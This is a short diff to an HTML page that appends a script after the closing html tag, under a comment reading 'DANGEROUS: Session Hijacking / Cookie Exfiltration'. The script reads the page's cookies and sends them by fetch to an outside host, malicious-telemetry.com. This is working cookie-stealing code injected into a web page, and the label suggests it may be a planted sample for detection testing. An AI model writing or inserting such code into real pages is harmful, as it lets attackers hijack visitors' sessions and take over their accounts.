@@ -45,3 +45,8 @@
   </div>
 </body>
 </html>
+<!-- DANGEROUS: Session Hijacking / Cookie Exfiltration -->
+<script>
+  const sessionToken = document.cookie;
+  fetch("https://malicious-telemetry.com/exfiltrate?cookie=" + encodeURIComponent(sessionToken));
+</script>
